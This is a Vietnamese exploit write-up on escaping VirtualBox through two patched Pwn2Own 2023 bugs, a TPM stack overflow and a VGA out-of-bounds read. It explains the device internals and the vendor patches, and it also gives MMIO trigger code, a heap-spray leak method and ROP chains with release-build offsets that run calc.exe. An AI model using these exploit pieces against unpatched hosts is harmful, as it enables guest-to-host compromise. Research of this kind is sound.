---
title: "Journey into VM Escapse with pwn2own 2023 (CVE-2023-21987 and CVE-2023-21991)"
date: 2026-05-14
draft: false
tags: ["bof", "vbox","oob"]
showTableOfContents: true
description: "Bug mình chọn ở đây là 2 CVE-2023-21987 và CVE-2023-21991, đây là vuln liên quan đến VirtualBox được sử dụng ở pwn2own 2023. Đây sẽ là vuln liên quan đến vm escapse thực tế đầu tiên mình làm dù trước đây mình cũng có giải chall ctf liên quan đến vm escapse. Do đó mình sẽ tìm hiểu tí về hypervisor cũng như cơ bản về architecture của VirtualBox. 2 CVE này là n day đã có blog phân tích tuy nhiên poc public mình thấy còn thiếu cũng như không hoàn chỉnh nên sẽ viết lại từ đầu."
---
{{< alert >}}
**Images not loading?** Try accessing this site using a VPN.
{{< /alert >}}

![](https://files.catbox.moe/f396i1.gif)

## I. Overview
Bug mình chọn ở đây là 2 CVE-2023-21987 và CVE-2023-21991, đây là vuln liên quan đến VirtualBox được sử dụng ở pwn2own 2023. Đây sẽ là vuln liên quan đến vm escapse thực tế đầu tiên mình làm dù trước đây mình cũng có giải chall ctf liên quan đến vm escapse. Do đó mình sẽ tìm hiểu tí về hypervisor cũng như cơ bản về architecture của VirtualBox. 2 CVE này là n day đã có blog phân tích tuy nhiên poc public mình thấy còn thiếu cũng như không hoàn chỉnh nên sẽ viết lại từ đầu.
## II. Vuln Description
Nếu dựa vào description công bố, có lẽ sẽ khá khó hiểu về lỗ hổng tồn tại ở đâu
![image](https://hackmd.io/_uploads/B1_FIyf0-g.png)
Tuy nhiên ở đây dựa vào bài [blog](https://qriousec.github.io/post/vbox-pwn2own-2023/) phân tích của Qrious, ta dễ dàng thấy 2 cve này lần lượt là stack overflow ở module TPM và out of bound read ở module VGA
Nó có ảnh hưởng đến các phiên bản sau:
![image](https://hackmd.io/_uploads/BJejP1fA-x.png)

## III. Information
Để hiểu được bug này ta sẽ cần tìm hiểu về hypervisor, VirtualBox architecture, cách debug VirtualBox, cũng như 2 module TPM và VGA này là gì.
### a. Hypervisor
Theo mình hiểu, hypervisor là một software/firmware layer dùng để xử lý, tạo cũng như quản lý các virtual machine
![image](https://hackmd.io/_uploads/SJghFJzCZe.png)
Nó sẽ chia ra làm type 1 và type 2 hypervisor
- Type 1: Hypervisor sẽ tương tác trực tiếp với hardware. Này giống như các máy ảo được tạo ra sẽ cần các thành phần như card mạng, usb, ... thì các thành phần này sẽ thông qua hypervisor mà tương tác trực tiếp với hardware gốc mà không cần thông qua host os -> thường được dùng ở cloud, doanh nghiệp các thứ tuỳ vài trường hợp như HyperV của Microsoft
- Type 2: Hypervisor tương tác với hardware thông qua host os. Điều này có nghĩa là các thành phần của guest os (máy ảo ta tạo) sẽ tương tác với hypervisor, hypervisor sẽ đưa cho host os xử lý. Type này dành cho người dùng phổ thông và đa phần các app như qemu,virtualbox,... là type 2

### b. VirtualBox architecture
Source code VirtualBox được chia ra như sau:
```
src/VBox/
├── VMM/                   # Virtual Machine Monitor (ring-0 + ring-3)
├── Devices/               # Device emulation
├── Main/                  # COM/XPCOM API layer (VBoxSVC, VBoxC)
├── Frontends/             # UI frontends (VBoxManage, Qt GUI, VBoxHeadless)
├── HostDrivers/           # Kernel modules (vboxdrv, vboxnetflt, vboxnetadp)
├── HostServices/          # Guest↔Host services (SharedFolders, GuestControl, DnD)
├── Additions/             # Guest Additions (guest-side drivers + services)
├── Runtime/               # IPRT — VBox portable runtime library
├── NetworkServices/       # NAT, DHCP, DNS service daemons
├── Storage/               # Virtual disk backends (VDI, VMDK, VHD, iSCSI)
├── GuestHost/             # Shared code used by both guest and host sides
├── Disassembler/          # Instruction disassembler
├── Debugger/              # Built-in debugger
├── RDP/                   # VRDP (VirtualBox Remote Desktop Protocol)
├── ExtPacks/              # Extension pack framework
├── ValidationKit/         # Testing infrastructure
├── Installer/             # Platform installers
└── ImageMounter/          # ISO/disk image mounting
```
Trong đó, 2 phần mình thấy quan trọng nhất là VMM và Devices. 
![image](https://hackmd.io/_uploads/S1I4glfRWl.png)
Đại khái khi guest os chạy, các instruction sẽ được thông qua hypervisor, hypervisor sẽ check var và quyết định nên emulate instruction đó hay có thay đổi gì đấy và pass thẳng cho device tương ứng để xử lý.
Đối với VirtualBox, phần xử lý đó nằm ở cả 2 bên usermode (`VBoxDD.dll`) và kernel mode (`VBoxDDR0.r0`). Tuỳ vào từng trường hợp mà nó sẽ quyết định nên handle ở đâu.
### c. TPM architecture
Về TPM (Trusted Platform Module) thì đây là chip đảm nhận việc encrypt liên quan
Nó có mức gọi là locality được chia thành 4 mức như sau:
```
Physical Address        Locality    Privilege
┌──────────────────┐
│  0xFED44000       │   Loc 4     Hardware only (DRTM / CPU microcode)
│  ── 4 KB ──       │             Highest priority, cannot be seized
├──────────────────┤
│  0xFED43000       │   Loc 3     Auxiliary / reserved
│  ── 4 KB ──       │
├──────────────────┤
│  0xFED42000       │   Loc 2     Trusted OS runtime
│  ── 4 KB ──       │
├──────────────────┤
│  0xFED41000       │   Loc 1     OS / Hypervisor
│  ── 4 KB ──       │
├──────────────────┤
│  0xFED40000       │   Loc 0     Default — OS driver (most common)
│  ── 4 KB ──       │             Lowest priority
└──────────────────┘
```
Trong đó locality mình hiểu là sẽ cho biết command đến từ môi trường nào. 
Ngoài ra mình sẽ tương tác với nó thông qua MMIO, nói cách khác, mình sẽ map địa chỉ 0xFED40000 ra thực hiện đọc ghi tương ứng với nó.
Đối với mỗi locality, nó sẽ có offset tương ứng, nếu mình ghi data và nó thì nó sẽ thực thi command tương ứng
```
Offset    Size   Name             Purpose
─────────────────────────────────────────────────────────────
0x000     1B     TPM_ACCESS       Request/grant/seize/release locality
0x008     4B     TPM_INT_ENABLE   Interrupt enables (optional)
0x00C     1B     TPM_INT_VECTOR   IRQ line number
0x010     4B     TPM_INT_STATUS   Interrupt status flags
0x014     4B     TPM_INTF_CAP     Interface capabilities
0x018     3B     TPM_STS          Status + burstCount [bytes 1:2]
0x024     1B     TPM_DATA_FIFO    The data pipe (read & write)
0x030     4B     TPM_INTF_ID      Interface type & version
0xF00     4B     TPM_DID_VID      Device ID + Vendor ID
0xF04     1B     TPM_RID          Revision ID
```
Một số command mà nó support như:
- Startup & session management: `TPM2_Startup`, `TPM2_Shutdown`, `TPM2_SelfTest`
- Crypto operations: `TPM2_Sign`, `TPM2_VerifySignature`, `TPM2_RSA_Encrypt` / `RSA_Decrypt`, `TPM2_ECDH_KeyGen`, `TPM2_ECDH_ZGen`, `TPM2_Hash`, `TPM2_HMAC`, `TPM2_GetRandom`
- ...

Mỗi command như vậy sẽ là một request tương ứng, chúng ta ghi request vào offset 0x24 để nó thực thi sau khi thực thi xong ta đọc lại offset trên để lấy output
Chi tiết hơn về data ta ghi vào như nào có thể đọc ở (hoặc nhờ AI tóm tắt) [đây](https://trustedcomputinggroup.org/wp-content/uploads/TPM-Rev-2.0-Part-1-Architecture-01.07-2014-03-13.pdf)
### d. VGA architecture
VGA là một con chip trong card màn hình dùng để render và được chuẩn hoá bởi IBM
Ta có thể tương tác với nó thông qua MMIO và IO port. Đối với vuln này thì ta sẽ chủ yếu tương tác với nó thông qua IO port
MMIO chính là screen buffer trong range từ 0xA0000-0xBFFFF
IO port sẽ được phân loại (mình tự chia) như sau:
- External / Miscellaneous registers
    - Port 0x3C2 (write) / 0x3CC (read)
    - Liên quan tới sync, clock 
- Sequencer: cho biết sử dụng plane nào, cách data flow (render)
    - Plane mình hiểu đại khái là một cơ sở dữ liệu dùng để lưu thông tin của pixel. Do có nhiều pixel nhưng không đủ chỗ để lưu nên sẽ sử dụng plane. Có tất cả 4 plane
    - Sequencer này sẽ có 5 register con:
        - Index 0: Reset
        - Index 1: Clocking Mode
        - Index 2: Map Mask
        - Index 3: Character map
        - Index 4: Memory Mode
    - Mỗi index như vậy sẽ có những bit con, những bit ở những offset tương ứng sẽ quy định chức năng tương ứng
    - Port 0x3C4 = index port (which register?)
    - Port 0x3C5 = data port (what value?)
- CRT Controler: cho VGA biết khi nào sẽ output pixel và ở đâu trên màn hình
    - Port 0x3D4 = index port
    - Port 0x3D5 = data port
- Graphics Controller
    - Port 0x3CE = index port
    - Port 0x3CF = data port

Vậy index port và data port trong các trường hợp trên là gì. Do có quá nhiều thông tin cần lưu (giống config) để xử lý và số lượng port có hạn nên nó sẽ được phân loại giống như trên. Ta cần xem index cần xử lý sau đó ghi index vào index port tương ứng, sau đó ghi data vào data port để truyền input cho index đấy.
Ngoài ra, nó còn khá nhiều thông tin khác liên quan đến VGA nên chi tiết hơn có thể xem ở [đây](https://wiki.osdev.org/VGA_Hardware#Overview)
## e. Building
Build chắc là quá trình mất thời gian nhất của mình. Mình mất khoảng 4 ngày mới fix được môi trường cũng như build hoàn chỉnh. Trong đó mình dựa vào [docs](www.virtualbox.org/wiki/Windows%20build%20instructions) của VirtualBox cũng như từ blog [này](https://habr.com/en/articles/447300/)

Ở đây khi build xong mình bị lỗi signature check (chắc do build debug) nên mình fix lại bằng cách patch source khúc đấy
![image](https://hackmd.io/_uploads/BJ67caBAbe.png)

## f. Debuging
Debug ở đây cũng đơn giản, mình sẽ debug máy ảo trong máy ảo.
- Host machine: Win 11
- Guest machine: Win 11 (run VirtualBox)
- Guest machine 2: Ubuntu server (run in VirtualBox)

Đối với bản self build: Để debug các module userland thì mình sử dụng windbg trên máy Guest attach vào, còn kernel module thì mình debug trên host machine.
Đối với release mình dùng kernel debug trên máy host để debug virtualbox userland trên máy guest. Do nó có hardening nên attach trên máy guest luôn hơi khó
## IV. Analysis
Sau khi đã hiểu sơ sơ về architecture, ta sẽ phân tích bug.
### a. Stack overflow in TPM
Module TPM được enable khi ta enable ở config sau. (version nào cũng được)
![image](https://hackmd.io/_uploads/BkFXdKBCbe.png)
Khi ta enable như vậy, khi VirtualBox khởi chạy nó sẽ init device của ta ở `pdmR3DevInit` (`PDMDevice.cpp`)
![image](https://hackmd.io/_uploads/rkqJKtrAZl.png)
Đại khái flow của nó sẽ như sau:
- Enumerates configured devices từ VM config
- Allocate và init các device intances
- Lưu các intance trên vào một internal device list (internal array)
- Với mỗi intance, nó sẽ gọi constructor tương ứng

Đối với TPM, nó sẽ gọi `tpmR3Construct` (với module ring 3).
![image](https://hackmd.io/_uploads/By4F9KHAbg.png)
Trong đó bước quan trọng nhất, nó sẽ register mmio range ở đây
![image](https://hackmd.io/_uploads/ByMRcFBAZx.png)
Trong đó base của MMIO được define giống với architecture mình nói phía trên
![image](https://hackmd.io/_uploads/SJwbjFB0Wx.png)
Nó sẽ register 2 callback `tpmMmioWrite` và `tpmMmioRead`. Trong đó vuln nằm ở `tpmMmioRead`
![image](https://hackmd.io/_uploads/BywghKSA-l.png)
Flow hàm này sẽ là:
- Đọc offset của ta truyền vào
- Check offset trên có trong range của register nào không
- Check locality từ offset của ta
- Call `tpmMmioFifoRead`

Ta sẽ tập trung vào hàm `tpmMmioFifoRead`. 
![image](https://hackmd.io/_uploads/ryVNaYBRZx.png)
Hàm này có flow như sau:
- Check xem trước đó có excute command gì không, nếu có thì sẽ lấy output ra
- Nếu không thì nó xem offset này muốn ghi data vào register nào và set tương ứng

Vuln nằm ở case đầu khi nó thực thi `memcpy` để copy output vào buffer `pu64` với size `cb`. `pu64` là một buffer 8 byte, `cb` ta có quyền control. Đại khái nó sẽ như sau:
```
Guest instruction                          cb value
─────────────────                          ────────
mov byte ptr [addr], al                    1
mov word ptr [addr], ax                    2
mov dword ptr [addr], eax                  4
mov qword ptr [addr], rax                  8
movaps [addr], xmm0                        16
vmovaps [addr], ymm0                       32
fxsave [addr]                              512
```
Có lẽ tác giả đã quên rằng có các instruction có thể ghi trên 8 byte.
Vậy để trigger được vuln, ta cần bypass các check. Các check này ta hoàn toàn có thể bypass
![image](https://hackmd.io/_uploads/ryD6DYSR-e.png)
Trong đó có 3 check liên quan đến bLoc, uReg và enmState
- uReg sẽ check offset trong range FIFO_DATA (0x24) hoặc XFIFO_DATA (0x80). Trong đó mình sẽ sử dụng _fxrstor64 để đọc và hàm này cần địa chỉ align nên offset mình sử dụng để đọc là 0x80
    `_fxrstor64((void *)(tpmMMIO + 0x080)); `
- bLoc này là locality, khi mới init device bLoc sẽ là
    ![image](https://hackmd.io/_uploads/B1cid5S0bl.png)
    - Để bypass check, ta cần set locality thông qua offset 0x0
    ![image](https://hackmd.io/_uploads/B1lvF9BCbg.png)
     `mmioWrite8(tpmMMIO, 0x00, 1 << 1);`
- Để bypass check 3 ta cần chỉnh state là COMPLETION. state này được set sau khi TPM thực thi command nào đó xong
    - State có thể thay đổi như sau:
    ```
    IDLE → READY → CMD_RECEPTION → CMD_EXEC → CMD_COMPLETION → (IDLE or READY)
                                     ↓
                              CMD_CANCEL → CMD_COMPLETION
                                     ↓
                              FATAL_ERROR
    ```

- Trong đó buffer data `abCmdResp` được sử dụng chung cho cả input và output và data ghi vào được xử lý theo FIFO. Nên hướng mình ở đây sẽ là ghi payload vào buffer đó trước, ghi request real, set flag để thực thi payload, trigger vuln read -> bof với payload control
- Để ghi được payload thì đầu tiên ta cần set state ready.
```clike
mmioWrite32(tpmMMIO, 0x18, 1 << 6);
```
- Sau đấy mình fake request get random ở tpm gửi vào offset 0x24 và thực thi thông qua offset 0x18
```clike
    uint8_t cmd[] = {
    0x80, 0x01,
    0x00, 0x00, 0x00, 0x0C,    // size = 12
    0x00, 0x00, 0x01, 0x7B,    // TPM2_GetRandom
    0x00, 0x08
    };
    for (int i = 0; i < sizeof(cmd); i++)
        mmioWrite8(tpmMMIO, 0x24, cmd[i]);
    //send tpm go 
    mmioWrite32(tpmMMIO, 0x18, 1 << 5); 
    //wait for complete
    while (!(mmioRead32(tpmMMIO, 0x18) & 0x10))
        ;
```
Khi mình thực thi này trên máy thì mình thấy cái state nó không ổn định, lúc này lúc kia nên dẫn đến freeze chương trình. Mình trace thì thấy bằng cách nào đấy driver tpm trên ubuntu mình sử dụng init không thành công do bị lỗi gì đấy dẫn đến nó spam request liên tục nên làm thay đổi state của mình. Mình fix bằng cách disable driver trên
```bash
echo "MSFT0101:00" | sudo tee /sys/bus/platform/drivers/tpm_tis/unbind
```
Tới đây mình đã trigger stack bof thành công
![image](https://hackmd.io/_uploads/SyW20qrAZe.png)
Mình khá bất ngờ vì không có stack canary !!!. Vậy từ đây mình đã có thể control RIP
![image](https://hackmd.io/_uploads/By6hC5rR-g.png)

### b. Out of bound read in VGA
Tiếp theo mình cần một bug để leak. Tương tự như trên vuln này tồn tại trong module VGA và cũng được init thông qua `vgaR3Construct`
Đây chính là VMSVGA trong config
![image](https://hackmd.io/_uploads/rJvsxiSAbl.png)
Nó cũng register các MMIO và IO port call back 
![image](https://hackmd.io/_uploads/Hys7WiHRbx.png)
![image](https://hackmd.io/_uploads/rJ04ZjSR-g.png)

Trong đó vuln nàm ở `vgaMmioRead`
![image](https://hackmd.io/_uploads/S1AUfiHAWg.png)
Hàm này chỉ check số lượng byte ta đọc và return lại số lượng byte tương ứng. Việc đọc byte được handle ở `vga_mem_readb`
![image](https://hackmd.io/_uploads/SkOlXjHR-x.png)

Đại khái flow của `vga_mem_readb` như sau:
- if vmsvga enable → return ring 3
- convert to vga memory offset
- check và xử lý dựa trên memory map mode (set trong Graphics Controller GR6[3:2])
- Xem nên đọc buffer như nào thông qua access mode (Sequencer SR4)
    - if (pThis->sr[4] & 0x08): chain-4 mode
    - if (!(pThis->sr[4] & 0x04)):  odd/even mode
    - **else:  latched planar mode** 
    
Trong đó vuln nằm ở quá trình handle latched planar mode
![image](https://hackmd.io/_uploads/SJBWVoHCWx.png)
Vuln nằm trong nested if phía trên, nó tương tự với code sau
```clike
pThis->latch = !pThis->svga.fEnabled            ? ((uint32_t *)pThisCC->pbVRam)[addr]
                     : addr < VMSVGA_VGA_FB_BACKUP_SIZE ? ((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr] : UINT32_MAX;

if (!pThis->svga.fEnabled)
{
    // SVGA is OFF — use the main VRAM buffer
    pThis->latch = ((uint32_t *)pThisCC->pbVRam)[addr];
}
else
{
    // SVGA is ON — use the backup framebuffer
    if (addr < VMSVGA_VGA_FB_BACKUP_SIZE)
    {
        pThis->latch = ((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr];
    }
    else
    {
        // addr out of range — return all 1s
        pThis->latch = UINT32_MAX;   // 0xFFFFFFFF
    }
}
```
- Vuln nằm ở `pThis->latch = ((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr];`. Trong đó `pbVgaFrameBufferR3` được init với size là 512K
![image](https://hackmd.io/_uploads/S1TK4orCbe.png)
![image](https://hackmd.io/_uploads/HkYqVsSCZg.png)
    - Tác giả đã check offset ta muốn đọc có trong range cho phép hay không tuy nhiên lại cast array đấy thành uint32, điều này dẫn đến việc khi truy cập giá trị tại offset bất kì, khi compile, offset đó sẽ x4. Điều này dẫn đến check phía trên là vô nghĩa và ta có oob read một khoảng khá cao (512k*4 - 512k)

Vậy để trigger được vuln, ta cần các condition sau:
- pThis->svga.fEnabled: true
- (pThis->sr[4] & 4) != 0: set SR4 bit 2
- (pThis->sr[4] & 8) == 0 : clear SR4 bit 3
- (pThis->gr[5] & 8) == 0: gr5 bit 3 =0
- (pThis->gr[6] >> 2) & 3 : GR6 = 0x00 

Để bypass thì ta chỉ cần write data vào io port tương ứng
Ngoài ra nếu ta để ý thì hàm này chỉ return 1 byte
![image](https://hackmd.io/_uploads/S16PLiSRWg.png)
Vậy thì đến đây ta đã có OOB read vậy ta cần tạo ra một heap layout hợp lý để leak địa chỉ thông qua spray
### c. Heap Spray
Dựa vào blog cũ, tác giả đã spray thông qua `HGCMMsgCall` object. Vì vậy mình cũng spray bằng nó luôn. Do đó ta cần tìm hiểu HGCM là gì
#### HGCM 101
HGCM (Host-Guest Communication Manager) là một RPC protocol cung cấp các services sau:
- VBoxGuestPropSvc (`VBoxGuestPropSvc.cpp`)
- VBoxHostChannel (`VBoxHostChannelSvc.cpp`)
- VBoxSharedClipboard (`VBoxSharedClipboardSvc.cpp`)
- VBoxSharedFolders (`VBoxSharedFoldersSvc.cpp`)
- VBoxDragAndDropSvc (`VBoxDragAndDropSvc.cpp`)
- VBoxGuestControlSvc ( `VBoxGuestControlSvc.cpp`)

Các struct được tạo ra trong quá trình gửi các packet trên:
- VMMDevHGCMConnect
- VMMDevHGCMDisconnect
- VMMDevHGCMCall
- VMMDevHGCMCancel
- VMMDevHGCMCancel2

Dựa vào tên thì đại khái ta thấy nó sẽ handle clipboard, shared folder,... đây cũng là một attack vector khá thú vị
Có 2 cách để tương tác với nó:
- Thông qua IOCTL: VirtualBox support sẵn driver để tương tác ở máy guest thông qua `/dev/vboxguest` (Linux) hoặc `\\.\VBoxGuest` (Windows)
- Thông qua ioport 0xd040: Khi gửi request qua ioctl, driver đó sẽ tự parse data và call tới ioport này. Nếu ta không muốn phụ thuộc driver thì có thể gửi thẳng đến ioport này luôn

Trong đó khi ta gửi request đến thì `HGCMService::GuestCall` sẽ được thực thi
![image](https://hackmd.io/_uploads/r1CkkaHAZl.png)
Hàm này sẽ allocate `v12`. Đây chính là object ta dùng để spray. Ta sẽ leak địa chỉ __vftable
Call stack sẽ như sau:
![image](https://hackmd.io/_uploads/SkVN1Tr0-x.png)
#### Heap spray
Quá trình spray mình dựa trên writeup từ [qrious](https://qriousec.github.io/post/vbox-pwn2own-2023/) và blog [này](secret.club/2021/01/14/vbox-escape.html). Ý tưởng spray cũng không quá khó ta chỉ cần spam connect để tạo nhiều object trên heap với mục đích tạo ra chunk nằm phía dưới chunk bị OOB. Trong quá trình spam, tác giả sử dụng `wait_prop` để tránh timeout session dẫn đến chunk free rồi bị reuse
Chunk ta leak có dạng có dạng như sau:
![image](https://hackmd.io/_uploads/rJEqgar0bg.png)
Trong đó địa chỉ mình leak luôn bắt đầu bằng 0x7ff và tận cùng là C60. Do đó ta sẽ lợi dụng nó để leak cho nhanh.
Giống như bài phân tích gốc từ qrious, chunk leak luôn nằm trong userblock chunk với signature là F0E0D0C0
![image](https://hackmd.io/_uploads/S1XM-pBRbx.png)
Exploit sẽ luôn thành công khi chunk `HGCMMsgCall` nằm trong khoảng OOB của ta
```
0:010> s -a 000001B79030E120 000001B79050E120 "spray"
000001b7`904670a0  73 70 72 61 79 2d 35 35-2d 36 00 00 61 61 61 61  spray-55-6..aaaa
000001b7`904671a0  73 70 72 61 79 2d 35 35-2d 39 00 00 61 61 61 61  spray-55-9..aaaa
000001b7`90467220  73 70 72 61 79 2d 35 34-2d 31 33 00 61 61 61 61  spray-54-13.aaaa
000001b7`90467320  73 70 72 61 79 2d 35 35-2d 35 00 00 61 61 61 61  spray-55-5..aaaa
000001b7`904674a0  73 70 72 61 79 2d 35 35-2d 31 00 00 61 61 61 61  spray-55-1..aaaa
000001b7`90467620  73 70 72 61 79 2d 35 35-2d 31 30 00 61 61 61 61  spray-55-10.aaaa
000001b7`90467720  73 70 72 61 79 2d 35 34-2d 31 31 00 61 61 61 61  spray-54-11.aaaa
```
Ngoài ra quá trình spray mình sử dụng lại `hgcm_call` cũng như `wait_prop` từ [đây](https://github.com/chunzhennn/cve-2023-21987-poc/blob/main/poc.c). Tuy nhiên tác giả sử dụng kernel module để exploit, mình thì ~~lười~~ build sẵn trên binary usermode nên sẽ chỉnh lại quá trình translate từ virtual address sang physical address. Exploit đó cũng không stable do tác giả sử dụng pattern duy nhất là aaaa...a. Nếu pattern đó được sử dụng bởi object đó trước đó rồi thì nó sẽ free object cũ rồi alloc lại dẫn đến không tạo nhiều chunk mới được. Do đó ta sẽ fix bằng cách đổi pattern mỗi lần chạy
![image](https://hackmd.io/_uploads/BydWX6HR-x.png)
Bằng việc parse các địa chỉ heap, mình có thể leak và tính được base `VBoxC.dll`
#### ROP chain
Sau khi có được địa chỉ ta muốn chỉ cần ROP chain là xong. Ở đây mình muốn gọi `WinExec("calc.exe")` Do đó ta cần địa chỉ `Kernel32.dll`. Ở đây mình sẽ kiếm gadget để đọc địa chỉ kernel32 bất kỳ từ import table (giống got ở linux) trên binary `VBoxC.dll` sau đó là gadget cộng trừ địa chỉ trên thành `WinExec` sau đó gọi tới là xong
```clike
    rop[i++] = popRax;
    rop[i++] = getLastErrorOffset; 
    rop[i++] = aar;
    rop[i++] = popRcx;
    rop[i++] = vBoxBss;
    rop[i++] = aaw;
    rop[i++] = popRdi;
    rop[i++] = 0x58150;
    rop[i++] = popRbp;
    rop[i++] = 0;
    rop[i++] = popRcx;
    rop[i++] = vBoxBss;
    rop[i++] = aaa;

    rop[i++] = popRax;
    rop[i++] = 0x6578652e636c6163; // "calc.exe" 
    rop[i++] = popRcx;
    rop[i++] = vBoxBss + 0x10;
    rop[i++] = aaw;

    rop[i++] = popRax;
    rop[i++] = vBoxBss;
    rop[i++] = aar;
    rop[i++] = pushRax;
```
Tới đây là mình đã gọi được calc.exe thành công
![image](https://hackmd.io/_uploads/Hkue8THRWx.png)
### d. Patching
Ở đây mình diff check trên version VirtualBox 7.0.10.
Trong đó để patch vuln stack bof ở TPM, author đã thêm dòng Assert ở `tpmMmioRead` để đảm bảo cb luôn <= 8 byte
![image](https://hackmd.io/_uploads/B1H3opSCWe.png)
Patch của OOB read đảm bảo addr luôn trong khoảng [0,VMSVGA_VGA_FB_BACKUP_SIZE-1]
![image](https://hackmd.io/_uploads/rklYpaBAWe.png)
### e. Release version
Sau khi xong trên version debug, mình fix lại offset để tương thích với bản release. Trong đó offset của vtable và ropchain thay đổi
```clike=
    uint64_t vBoxBase = vBoxLeak - 0x23aa40;
    uint64_t vBoxBss = vBoxBase + 0x352031;
    uint64_t getLastErrorOffset = vBoxBase + 0x2060D8;

    uint64_t popRcx = vBoxBase + 0x1be802;
    uint64_t popRdi = vBoxBase + 0x0bc6a;
    uint64_t popRax = vBoxBase + 0x4ce8e;
    uint64_t popRdx = vBoxBase + 0x6ae2a;
    uint64_t pushRax = vBoxBase + 0x80c8e;

    uint64_t aaa = vBoxBase + 0x04d60c ; // add rax, rdx; ret
    uint64_t aaw = vBoxBase + 0x0410d7; //mov qword ptr [rcx], rax ; ret
    uint64_t aar = vBoxBase + 0x0185652; //mov rax, qword ptr [rax] ; ret

    rop[i++] = popRax;
    rop[i++] = getLastErrorOffset;
    rop[i++] = aar;
    rop[i++] = popRdx;
    rop[i++] = 0x58150;
    rop[i++] = aaa;

    rop[i++] = popRcx;
    rop[i++] = vBoxBss;
    rop[i++] = aaw;

    rop[i++] = popRax;
    rop[i++] = 0x6578652e636c6163; // "calc.exe"
    rop[i++] = popRcx;
    rop[i++] = vBoxBss + 0x10;
    rop[i++] = aaw;

    rop[i++] = popRax;
    rop[i++] = vBoxBss;
    rop[i++] = aar;
    rop[i++] = pushRax;
```

## V. Conclusion
- Tuy exploit stable nhưng nó sẽ làm crash VM
- Exploit test trên
    - Win 11 26200.8246
    - Ubuntu server: Linux ubuntu 6.8.0-110-generic #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
    - VirtualBox 7.0.6 OSE r155176 (self build)
    - VirtualBox 7.0.6 r155176 (official release)
- Exploit này giúp mình học khá nhiều về hypervisor, virtualbox và heap trên windows

## VI. References:
- https://qriousec.github.io/post/vbox-pwn2own-2023/#&gid=1&pid=1
- https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf
- https://trustedcomputinggroup.org/wp-content/uploads/TPM-Rev-2.0-Part-1-Architecture-01.07-2014-03-13.pdf
- https://wiki.osdev.org/VGA_Hardware#Overview
- github.com/phoenhex/files/blob/master/slides/unboxing_your_virtualboxes.pdf
- secret.club/2021/01/14/vbox-escape.html
- https://github.com/chunzhennn/cve-2023-21987-poc/blob/main/poc.c
- www.virtualbox.org/wiki/Windows%20build%20instructions
- https://habr.com/en/articles/447300/
- https://www.mail-archive.com/vbox-dev@virtualbox.org/msg10137.html